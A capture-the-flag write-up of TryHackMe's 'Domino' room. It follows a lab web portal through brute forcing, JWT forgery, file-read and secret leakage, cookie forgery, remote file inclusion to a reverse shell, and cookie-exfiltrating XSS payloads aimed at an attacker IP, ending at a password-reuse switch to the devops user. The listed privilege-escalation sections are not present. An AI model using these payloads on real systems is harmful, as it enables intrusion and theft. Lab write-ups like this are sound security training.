# Domino: TryHackMe

- **Platform:** TryHackMe
- **Room:** [Domino](https://tryhackme.com/room/domino)
- **Target:** NexusCorp Employee Portal
- **Target IP:** `10.49.184.182`
- **Attacker IP:** `10.48.122.251`
- **Status:** Completed. Full chain from zero credentials to `root`:
  - web-app exploit chain (JWT forgery → LFI → secret leakage → admin impersonation)
  - RFI → RCE as `www-data`
  - lateral movement to `devops` via credential reuse
  - privilege escalation to `root` via a cron-triggered write to a group-writable monitoring script

## Table of Contents

- [TL;DR](#tldr)
- [Attack Chain](#attack-chain)
- [Challenge Context and Initial Observations](#challenge-context-and-initial-observations)
- [Reconnaissance and Triage: Username Enumeration and Password Reuse](#reconnaissance-and-triage-username-enumeration-and-password-reuse)
- [Mapping the Authenticated Attack Surface](#mapping-the-authenticated-attack-surface)
- [Investigation: Breaking the JWT](#investigation-breaking-the-jwt)
- [Investigation: From File Read to Full Source Disclosure](#investigation-from-file-read-to-full-source-disclosure)
- [Investigation: Hardcoded Secrets and the Pivot to Admin Impersonation](#investigation-hardcoded-secrets-and-the-pivot-to-admin-impersonation)
- [A Finding That Needed None of the Above: IDOR](#a-finding-that-needed-none-of-the-above-idor)
- [Exploitation: From File Read to Remote Code Execution](#exploitation-from-file-read-to-remote-code-execution)
- [Rabbit Hole: Misdiagnosing the Ticket-Review Mechanism](#rabbit-hole-misdiagnosing-the-ticket-review-mechanism)
- [Lateral Movement: From Web Shell to a Real OS Account](#lateral-movement-from-web-shell-to-a-real-os-account)
- [Privilege Escalation: From a Fully Mapped Path to Root](#privilege-escalation-from-a-fully-mapped-path-to-root)
- [Flags Captured](#flags-captured)
- [Lessons Learned](#lessons-learned)

---

## TL;DR

The web app on its own is a chain of small issues that compound into full administrative takeover:

- leaked usernames
- a shared weak password
- a JWT whose signature is never checked
- a path-traversal file reader
- and hardcoded secrets that let us forge any user's session.

From there we found a second bug in the same file-read endpoint: it also fetches and executes `_remote_` URLs, which turned a "read files" feature into full remote code execution. That got us a shell as `www-data`, and from there a reused database password walked us straight into an OS-level account (`devops`).

We mapped two separate root-owned write primitives along the way. One was a `777` script tied to a self-restarting systemd service, and we never found what actually triggers that restart.

The other, a monitoring script writable by the `devops` group, turned out to be the one that worked: it's executed every `60 seconds` by a cron job defined in root's own personal crontab, a location that's deliberately unreadable to `devops` even though the script itself isn't. Appending a reverse shell to it, and waiting for the next tick, got us root.

## Attack Chain

```mermaid
flowchart TD
    A["Recon: 'Our Team' page<br/>7 usernames leaked"]:::gray
    B["Hydra brute force<br/>weak reused password"]:::web
    C["JWT role forged<br/>signature never verified"]:::web
    D["LFI via files.php<br/>source + secrets disclosed"]:::web
    E["Cookie forged<br/>full admin impersonation"]:::web
    F["RFI via same endpoint<br/>RCE as www-data, flag3"]:::web
    G["Credential reuse<br/>su devops, flag4"]:::host
    H["Root cron trigger found<br/>health_report.sh, every 60s"]:::host
    I["Reverse shell fires<br/>root shell, root flag"]:::host

    IDOR["IDOR finding<br/>flag1, no forgery needed"]:::indep
    RABBIT["Blind-XSS hypothesis<br/>corrected: SSRF via admin_bot.py"]:::gray

    A --> B --> C --> D --> E --> F --> G --> H --> I
    B -.-> IDOR
    E -.-> RABBIT

    classDef web fill:#EEEDFE,stroke:#534AB7,color:#26215C
    classDef host fill:#FAECE7,stroke:#993C1D,color:#4A1B0C
    classDef indep fill:#E1F5EE,stroke:#0F6E56,color:#04342C
    classDef gray fill:#F1EFE8,stroke:#5F5E5A,color:#2C2C2A
```

## Challenge Context and Initial Observations

The room drops you against a single IP with no other context beyond "NexusCorp Employee Portal." We started the way we start most black-box web assessments: find out what's actually listening before touching the application itself.

```bash
nmap -sV -sC 10.49.184.182
```

```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
```

Only two ports.

- SSH was never a usable entry point this session: we never obtained a credential we could present to it directly (more on that later, since one of our later findings _suggests_ SSH might work without us ever proving it).
- That leaves the web application as the entire attack surface, so everything from here on is about that one PHP/Apache app.

![NexusCorp Employee Portal login page](images/login.png)

The login page itself gave us two things worth noting:

1. The username placeholder (`firstname.lastname`) told us the account-naming convention.
2. A footer link to "Our Team" told us where to go find real names to plug into that convention.

![NexusCorp "Our Team" page listing all 7 employees](images/our-team-page.png)

That page handed us 7 `full names`, `roles`, `departments`, and `email addresses`, which, combined with the naming convention from the login page, gave us seven concrete usernames to work with:

| Username      | Role                      | Department           |
| ------------- | ------------------------- | -------------------- |
| laura.hayes   | Chief Information Officer | Executive Leadership |
| michael.chen  | Lead Security Engineer    | InfoSec              |
| sarah.johnson | Senior Software Engineer  | Engineering          |
| robert.wilson | DevOps Engineer           | Infrastructure       |
| emma.taylor   | Product Manager           | Product              |
| david.brown   | Full Stack Developer      | Engineering          |
| james.wright  | Systems Administrator     | Infrastructure       |

This one page is the hinge the whole rest of the investigation turns on: it's what converted "guess a username blind" into "brute-force against seven known accounts."

## Reconnaissance and Triage: Username Enumeration and Password Reuse

Before trying anything against the login form itself, we checked whether the application leaked account existence anywhere else.

The login form (`index.php`) was well-behaved: it returned the same generic `"Invalid credentials"` message regardless of whether the username or the password was wrong. The password-reset flow at `/forgot.php`, though, did not:

```json
POST /forgot.php  username=nobody.here
→ "No account found with that username."

POST /forgot.php  username=laura.hayes
→ "Password reset instructions have been sent to la****@nexus.corp"
```

That's a textbook username-enumeration oracle, and there was no CSRF token on the `POST` either, so nothing stopped us from hammering it.

Combined with no rate-limiting we ever observed, this confirmed all seven names from the "Our Team" page as real, live accounts, though we already had strong reason to believe that from the page itself; this just gave us a second, independent confirmation channel.

With seven confirmed usernames, we turned to credential brute-forcing with `Hydra`, deliberately spacing requests to avoid tripping any lockout we hadn't yet confirmed was absent:

```bash
hydra -L usernames.txt -P 10-million-password-list-top-1000.txt 10.49.184.182 \
  http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials" -t 4
```

Three of the seven accounts fell to the single literal password `password`:

- `sarah.johnson : password`
- `robert.wilson : password`
- `emma.taylor : password`

What stood out wasn't that three accounts were weak. It's _which_ three.

- The CISO, the Lead Security Engineer
- The Full Stack Developer
- The SysAdmin all survived the list untouched

Only the three roles without an obvious security focus reused a trivial password.

This gave us our first authenticated foothold: low-privilege, `role: user`, with zero exploitation required.

## Mapping the Authenticated Attack Surface

Logged in as `emma.taylor`, we walked the dashboard by hand before touching any API directly.

![Dashboard after logging in as emma.taylor](images/emma-taylor-dashboard.png)

The dashboard exposed:

- A profile card (`username` / `email` / `role`).
- A **"File Viewer"** at `/api/files.php?name=`, described as accessing "internal documents via the secure file API."
- A JWT-issuing endpoint at `/api/auth/token.php`.
- Quick links to a support-ticket system (ticket list, open-ticket form).

"Secure file API" is the kind of phrase that invites scrutiny, so that's where we went next.

![Support Tickets page](images/support-tickets.png)
![Open Ticket page](images/open-ticket.png)

## Investigation: Breaking the JWT

The File Viewer required a JWT, issued by `/api/auth/token.php`:

```json
GET /api/auth/token.php

{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJlbW1hLnRheWxvciIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkzMTExMDgwLCJleHAiOjE3OTMxMTQ2ODB9.E09V9wiSlx88skw/b1Ild+7ydX5h2y190S0VKUR8wos",
  "expires_in": 3600,
  "note": "Use this token as: Authorization: Bearer <token> for /api/files.php"
}
```

A JWT's header and payload are only base64url-_encoded_, not encrypted, so we decoded them locally to see exactly what the server was trusting, before touching the signature at all:

```bash
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

echo -n "eyJzdWIiOiJlbW1hLnRheWxvciIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkzMTExMDgwLCJleHAiOjE3OTMxMTQ2ODB9" | base64 -d
# {"sub":"emma.taylor","role":"user","iat":1793111080,"exp":1793114680}
```

The `role` claim sits right there in plaintext. That's not inherently a vulnerability. Plenty of JWTs carry readable claims and rely entirely on the signature to stop you from changing them, but it's the thing worth testing next.

We grabbed a second token, for `robert.wilson`, and used it as an honest, legitimate baseline first:

```bash
$ curl -s "http://10.49.184.182/api/files.php?name=robert" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTMxMTE2MjAsImV4cCI6MTc5MzExNTIyMH0.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc" -v
...
< HTTP/1.1 403 Forbidden
<
{"error":"Admin JWT required. Check your token payload."}
```

It seems like the endpoint is gating on the `role` claim specifically, and nothing in that response told us whether the signature was actually being checked.

So we tested the hypothesis directly rather than assuming: we edited the decoded payload's `role` to `admin`, re-encoded it, and reattached the **original, now-mismatched** signature unchanged.

```bash
$ curl -s "http://10.49.184.182/api/files.php?name=robert" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc" -v
...
< HTTP/1.1 403 Forbidden
<
{"error":"Access denied: path must be within \/var\/www\/html\/"}
```

It accepted it. The error changed from "admin required" to a filesystem-path error, meaning the forged `admin` role got us past the role check entirely, and we'd now exposed an _entirely different_ bug underneath it.

We later confirmed the root cause directly from source (below): the signature-comparison line in `verify_jwt()` was simply commented out.

```php
function verify_jwt($token) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) return null;

    $payload = json_decode(base64_decode($parts[1]), true);
    if (!$payload) return null;

    // Signature check intentionally disabled
    // $expected = rtrim(base64_encode(hash_hmac('sha256', "$parts[0].$parts[1]", JWT_SECRET, true)),'=');
    // if (!hash_equals($parts[2], $expected)) return null;

    if (isset($payload['exp']) && $payload['exp'] < time()) return null;
    return $payload;
}
```

Worth noting: `generate_jwt()` always issues `role: 'user'` regardless of a real admin's actual DB role, so even logging in as the genuine CISO wouldn't have handed us an admin-role token through the normal flow.

Forging the claim client-side was the _only_ practical way to get an admin JWT at all, not just the easiest one.

## Investigation: From File Read to Full Source Disclosure

The new error, `"Access denied: path must be within /var/www/html/"`, told us `name` gets concatenated into a filesystem path. We tried straightforward traversal toward `/etc/passwd` first, with and without a redundant `/var/www/html/` prefix, and both were blocked with the identical error.

That ruled out a naive string-prefix check; the containment logic behaves like a `realpath()`-based normalization, which is a meaningfully harder thing to escape than a sloppy prefix match.

Rather than keep guessing traversal depth blindly, we requested a file we already knew existed:

```bash
$ curl -s "http://10.49.184.182/api/files.php?name=index.php" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
< HTTP/1.1 200 OK
{"file":"\/var\/www\/html\/api\/index.php","content":"  "}
```

That one request told us more than any amount of traversal guessing:

- The real working directory is `/var/www/html/api/`, one level _deeper_ than the error message implied.
- A single `../` would reach sibling files that the containment check still treats as "within" the permitted root, since they genuinely are.
- We went after `forgot.php` first since it was already a known endpoint.

```bash
$ curl -s "http://10.49.184.182/api/files.php?name=../forgot.php" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
< HTTP/1.1 200 OK
{"file":"\/var\/www\/html\/forgot.php", ...}
```

Its source confirmed the username-enumeration logic we'd already inferred from behavior, and surfaced a second thread we never fully chased down: a developer comment reading `// (token NOT bound to requesting user - logic flaw)` on the password-reset token generation. We never located the endpoint that actually consumes a reset token, so whatever that flaw enables is still an open question.

We kept pulling sibling files the same way, working outward from what we already knew existed. The root-level `index.php`, the login page itself, was an easy next target:

```bash
curl -s "http://10.49.184.182/api/files.php?name=../index.php" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzI4MzY4MiwiZXhwIjoxNzkzMjg3MjgyfQ.6wbbk4C2sFcyY4eTJtzDuXL2XrgcDRJtz7o6RvsDTJE"
```

```php
<?php
require_once __DIR__ . '/auth.php';

$user = get_session();

if ($user) {
    header('Location: /dashboard.php');
    exit;
}

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';

    if ($username && $password) {
        $db = get_db();

        $stmt = $db->prepare(
            'SELECT id, username, email, role, password_hash
             FROM users WHERE username = ?'
        );
        $stmt->execute([$username]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($row && password_verify($password, $row['password_hash'])) {
            $cookie_data = base64_encode(json_encode([
                'user_id' => $row['id'],
                'username' => $row['username'],
                'role' => $row['role']
            ]));

            $sig = hash_hmac('sha256', $cookie_data, APP_SECRET);

            setcookie(
                'nexus_session',
                $cookie_data . '.' . $sig,
                0,
                '/',
                '',
                false,
                false
            );

            header('Location: /dashboard.php');
            exit;
        } else {
            $error = 'Invalid credentials';
        }
    }
}
?>
```

(The HTML login form below this is unchanged from what's already shown in the screenshot earlier in this writeup, so it's omitted here.)

This one is worth more than just confirming the login page exists. It's the actual code that builds a genuine `nexus_session` cookie on a real login, and it matches exactly the forgery we built by hand later: `base64(json)` for the payload, then `hash_hmac('sha256', $cookie_data, APP_SECRET)` as a hex digest for the signature. Once we had `APP_SECRET`, we weren't guessing at the cookie format, we'd already read the function that produces it.

Next we pulled `dashboard.php`, mostly to see what else existed beyond what we'd already clicked through in the browser:

```bash
curl -s "http://10.49.184.182/api/files.php?name=../dashboard.php" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzI4MzY4MiwiZXhwIjoxNzkzMjg3MjgyfQ.6wbbk4C2sFcyY4eTJtzDuXL2XrgcDRJtz7o6RvsDTJE"
```

The page matched what we'd already seen rendered when we walked the dashboard by hand (profile card, File Viewer, quick links), with one addition the rendered page didn't make as obvious. The raw markup carried the literal URL pattern of an API we hadn't tested yet:

```php
<a href="/api/users/profile.php?id=<?= $user['id'] ?>">
    My Profile API
</a>
```

With `dashboard.php`'s own links in front of us, we guessed `create.php` might sit at the same level as `index.php` and `dashboard.php`:

```bash
curl -s "http://10.49.184.182/api/files.php?name=../create.php" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzI4MzY4MiwiZXhwIjoxNzkzMjg3MjgyfQ.6wbbk4C2sFcyY4eTJtzDuXL2XrgcDRJtz7o6RvsDTJE"
```

```json
{ "error": "Access denied: path must be within \/var\/www\/html\/" }
```

Same generic error as before. On its own, that message doesn't distinguish "outside the allowed root" from "path doesn't exist," it reads identically either way, so this result alone was a dead end.

The dashboard source we'd just read is what actually resolved it: it links to `/support/create.php`, not a bare `/create.php`, which is the correct relative path for the successful pull below.

The `forgot.php` file requires `auth.php`, so we pulled that next, and this is where the JWT bug's root cause and the session-cookie mechanism both became visible:

```php
function get_session() {
    if (!isset($_COOKIE['nexus_session'])) return null;
    $raw = $_COOKIE['nexus_session'];

    // Cookie format: base64(json).hmac_sha256(base64(json), APP_SECRET)
    $parts = explode('.', $raw, 2);
    if (count($parts) !== 2) return null;

    $expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);
    if (!hash_equals($expected_sig, $parts[1])) return null;

    $decoded = base64_decode($parts[0]);
    $data = json_decode($decoded, true);
    if (!$data || !isset($data['user_id'])) return null;

    // Role always fetched from DB - cookie role value ignored
    $db = get_db();
    $stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = ?');
    $stmt->execute([$data['user_id']]);

    return $stmt->fetch(PDO::FETCH_ASSOC);
}
```

This cookie scheme is actually implemented correctly on its own: it's HMAC-verified with `hash_equals`, and it always re-fetches the role fresh from the database rather than trusting whatever the cookie claims.

The problem is that `auth.php` itself `require_once`s `config.php`, which we read next.

## Investigation: Hardcoded Secrets and the Pivot to Admin Impersonation

```bash
$ curl -s "http://10.49.184.182/api/files.php?name=../config.php" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```

```php
<?php
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');

function get_db() {
    $pdo = new PDO(
        'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME,
        DB_USER,
        DB_PASS
    );

    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    return $pdo;
}
?>
```

`DB_PASS` and `JWT_SECRET` tie back into the already-broken JWT path. `APP_SECRET` is the one that mattered most right then: it's the key signing the `nexus_session` cookie we'd just read the verification logic for.

> A note for anyone reproducing this: the two HMAC calls in this codebase encode differently. `generate_jwt()` uses `hash_hmac(..., true)` (raw bytes, then base64-encoded); `get_session()` uses `hash_hmac(...)` with no third argument (a hex digest). Get that wrong and your forged cookie will silently fail signature verification.

With the secret in hand, we forged a cookie for `user_id=1`: `laura.hayes`, the CISO.

```python
import hmac, hashlib, base64, json

secret = "nexus_app_k3y_2024"
user_id = 1

payload = base64.b64encode(json.dumps({"user_id": user_id}).encode()).decode()
sig = hmac.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()
cookie = f"{payload}.{sig}"

print(cookie)
```

```bash
$ curl -s http://10.49.184.182/dashboard.php -H "Cookie: nexus_session=eyJ1c2VyX2lkIjogMX0=.18774129655cf93459b228dfb1d4f0bedc37ab6e685747136c1da9c8104d6459" -v
< HTTP/1.1 200 OK
<h1>Welcome, laura.hayes</h1>
<p><strong>Role:</strong> admin</p>
<a href="/admin/index.php">Admin</a>
```

![Forged nexus_session cookie accepted by dashboard.php, inspected via browser DevTools](images/admin-dashboard.png)
![Administration Console at /admin/index.php, logged in as laura.hayes](images/admin-console.png)

Full impersonation of the organization's CISO, no password or MFA required. This whole chain (a disabled signature check two findings back) is what made every downstream step possible, which is worth sitting with: one line of commented-out verification code is the actual root cause behind source disclosure, secret leakage, _and_ admin impersonation.

## A Finding That Needed None of the Above: IDOR

Separately from the entire admin-impersonation chain, and reachable with nothing more than the ordinary `robert.wilson : password` login from the very start of the engagement, we tried incrementing the `id` parameter on the profile API:

```js
GET /api/users/profile.php?id=1
(session: robert.wilson, role: user, plain password login, no forged cookie/JWT)
```

![/api/users/profile.php?id=1 returning laura.hayes's full record](images/admin-profile.png)

It returned Laura Hayes's complete record, including a `notes` field that isn't even shown to her in her own UI, containing `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`.

No role check, no ownership check, nothing. Any authenticated user, regardless of privilege, can read any other user's full profile by guessing an ID.

## Exploitation: From File Read to Remote Code Execution

The path-containment check we'd already mapped assumes a local filesystem path: it normalizes and validates against `/var/www/html/`.

What we hadn't tested yet was what happens if `name` isn't a path at all, but a fully-qualified URL. `realpath()`-style normalization has no idea what to do with `http://`, and we had a hypothesis that it simply wouldn't trigger the same rejection.

We tested it cautiously, with a harmless static file first, rather than jumping straight to something that would prove or disprove execution:

```bash
python3 -m http.server 8000   # attacker box, serving index.html
```

```bash
curl -s "http://10.49.184.182/api/files.php?name=http://10.48.122.251:8000/index.html" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```

```bash
10.49.184.182 - - [29/Oct/2026 14:23:39] "GET /index.html HTTP/1.1" 200 -
```

The request landed on our listener. The containment check doesn't touch remote URLs at all. But a static HTML file being _fetched_ looks identical to one being _executed_, so to actually tell the difference, we needed a payload that behaves differently depending on which one is happening:

```php
<?php echo "RCE-TEST-" . (1337*2); ?>
```

```bash
curl -s "http://10.49.184.182/api/files.php?name=http://10.48.122.251:8000/exploit.php" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```

```json
{ "output": "RCE-TEST-2674" }
```

`1337*2` evaluating to `2674` server-side is unambiguous: that's PHP execution, not a file read. (The response key changing from `"file"`/`"content"` to `"output"` is also a clue that this is a genuinely separate code path, not an accidental side-effect of the same `include()` logic, something we flagged to go back and confirm from `files.php`'s own source later, and never actually got around to.)

Before reaching for a full shell, we confirmed OS command execution specifically, since some hardened PHP builds disable `system()`/`exec()`/`shell_exec()` individually regardless of general code-execution capability:

```php
<?php system('id'); ?>
```

```json
{ "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n" }
```

From there, a standard PentestMonkey PHP reverse shell, delivered through the same RFI primitive, was the obvious next step. Our first attempt went out before we'd actually started a listener:

```bash
curl -s "http://10.49.184.182/api/files.php?name=http://10.48.122.251:8000/php-reverse-shell.php" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzI4MzY4MiwiZXhwIjoxNzkzMjg3MjgyfQ.6wbbk4C2sFcyY4eTJtzDuXL2XrgcDRJtz7o6RvsDTJE"
```

```bash
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
[+] Listening for reverse shells on 0.0.0.0:4445 -> 127.0.0.1 • 10.49.120.226
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

```bash
python3 -m http.server 8000
```

```bash
curl -s "http://10.49.184.182/api/files.php?name=http://10.48.122.251:8000/php-reverse-shell.php" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```

![Listener and file server set up before the retry](images/reverse-shell-setup.png)

```bash
connect to [10.48.122.251] from (UNKNOWN) [10.49.184.182] 39894
Linux tryhackme-2404 6.17.0-1015-aws #15~24.04.1-Ubuntu SMP Thu May  7 17:00:14 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
 14:39:27 up  2:10,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

That `can't access tty; job control turned off` line is the concrete evidence behind a claim we make below: a raw `netcat` shell got us in, but it's a limited one, no job control, no signal handling, nothing but a bare pipe to `/bin/sh`.

We swapped it for a [Penelope](https://github.com/brightio/penelope)-managed shell for the rest of the session, which gave us a properly interactive terminal (and its built-in upload/download support).

Before moving on, we looked around `/opt` to see what else was on the box:

```bash
$ cd /opt
$ ls
__pycache__
admin_bot.py
flag3.txt
monitoring
tools
$ cat flag3.txt
THM{rf1_2_rc3_f00th0ld_fl4g3}
```

`admin_bot.py`, `monitoring/`, and `tools/` (which turned out to hold `pspy64`) are all things we come back to later in this writeup.

## Rabbit Hole: Misdiagnosing the Ticket-Review Mechanism

This is the one we got genuinely wrong for a while, and it's worth documenting the mistake honestly rather than smoothing it over.

The support-ticket creation page had a telling comment in its source: `// Message stored raw - no XSS filtering (intentional vulnerability)`, and the dashboard referenced tickets getting reviewed by "an admin."

```php
# support/create.php
<?php
require_once __DIR__ . '/../auth.php';

$user = require_login();
$msg = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $subject = trim($_POST['subject'] ?? '');
    $message = trim($_POST['message'] ?? '');

    if ($subject && $message) {
        $db = get_db();

        // Message stored raw - no XSS filtering (intentional vulnerability)
        $stmt = $db->prepare(
            'INSERT INTO tickets (user_id, subject, message) VALUES (?, ?, ?)'
        );
        $stmt->execute([$user['id'], $subject, $message]);

        $msg = 'Ticket submitted successfully. An admin will review it shortly.';
    } else {
        $error = 'Subject and message are required.';
    }
}
?>
```

Our working hypothesis was a classic stored/blind XSS scenario: a headless browser, acting as an admin, rendering our ticket content. We tested it the way you'd test blind XSS against a browser:

```html
<script>
  new Image().src = 'http://10.48.122.251:8000/hit?c=' + document.cookie;
</script>
```

Submitted as a ticket message, and after a short delay:

```
10.49.184.182 - - [29/Oct/2026 13:51:28] "GET /hit?c= HTTP/1.1" 404 -
```

Something fired, good, that confirmed _a_ processor exists. But `document.cookie` was empty. At the time we attributed this to a sandboxed iframe with an opaque origin (a real, standard technique for hardening against exactly this kind of attack), and tried pivoting to reading an authenticated response instead of the cookie directly:

```html
<script>
  fetch('/dashboard.php')
    .then((r) => r.text())
    .then(
      (d) =>
        (new Image().src =
          'http://10.48.122.251:8000/exfil?d=' + encodeURIComponent(d)),
    );
</script>
```

Empty again. Every time, regardless of target path, including `/index.php`, which is unauthenticated and always returns substantial content. That last result was the one that should have told us the sandboxed-browser theory didn't actually fit: an opaque-origin iframe explains an unreadable _response_, but it doesn't explain a request to a guaranteed-non-empty, unauthenticated page coming back as nothing.

While we were still working the browser-based theory, we also fuzzed for other files under `/admin/`, in case the review mechanism actually lived on a separate page we hadn't found yet:

```bash
ffuf -u "http://10.49.184.182/admin/FUZZ.php" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -H "Cookie: nexus_session=eyJ1c2VyX2lkIjogMX0=.18774129655cf93459b228dfb1d4f0bedc37ab6e685747136c1da9c8104d6459" -mc 200,302,403 -fc 404
```

```bash
index                   [Status: 200, Size: 1315, Words: 178, Lines: 44, Duration: 557ms]
:: Progress: [43007/43007] :: Job [1/1] :: 3747 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

Only `index` resolved; everything else that matched was just `.htaccess`-family files returning the server's standard `403`. That ruled out a hidden secondary admin page, the ticket-review logic had to be happening somewhere other than a page we could browse to directly, which turned out to matter once we found the real mechanism below.

We only got the real answer once we had OS-level access and could read the actual source:

```python
# /opt/admin_bot.py (relevant excerpt)
def process(t):
    msg = t["message"]
    url_pat = r"https?://[A-Za-z0-9./_?&=:%+-]+"
    urls = re.findall(url_pat, msg)
    for url in set(urls):
        requests.get(url, cookies=COOKIE, timeout=5)
```

There's no browser at all. `admin_bot.py` is a plain Python daemon that regexes ticket text for anything that looks like an `http(s)://` URL and fires a blind `requests.get()` at it, using a hardcoded admin cookie it computes once at startup from the leaked `APP_SECRET`, the exact same forgery technique we'd already used by hand.

In hindsight, every piece of our earlier confusion makes sense: our `fetch()` payloads used _relative_ paths, which never matched the regex at all, so `requests.get()` was never called for them.

The "hits" we did see were just the literal beacon URL substring inside our own ticket text getting pattern-matched and GET'd verbatim, never real exfiltrated content.

So the actual vulnerability here is **SSRF with an automatically attached privileged session**, not XSS. It's real and worth understanding properly, but it's not the vulnerability class we initially chased, and we only found that out by being wrong first and then getting better evidence.

## Lateral Movement: From Web Shell to a Real OS Account

Still in the raw `www-data` shell from the RFI, we poked around `/home` before trying anything:

```bash
$ cd /home
$ ls
devops
ubuntu
$ cd devops
/bin/sh: 9: cd: can't cd to devops
$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Apr 29  2026 .
drwxr-xr-x 22 root   root   4096 Oct 29 12:29 ..
drwxr-x---  3 devops devops 4096 May  9 17:19 devops
drwxr-xr-x  4 ubuntu ubuntu 4096 Apr 30 06:10 ubuntu
$ cd root
/bin/sh: 11: cd: can't cd to root
```

Both home directories exist and are owned by real accounts, but `devops`'s is locked down (`750`) so we couldn't walk in as `www-data`. We already had a password for `devops`, the database credential (`D3v0ps!2024`) reused from `config.php`, so the next question was simply whether that account existed on the OS and accepted a login shell:

```bash
$ cat /etc/passwd
...
devops:x:1001:1001::/home/devops:/bin/bash
```

`devops:x:1001:1001::/home/devops:/bin/bash` confirmed it: a real, login-capable local account. That was enough to try the credential reuse directly:

```bash
$ su devops
Password: D3v0ps!2024

whoami
devops
ls
devops
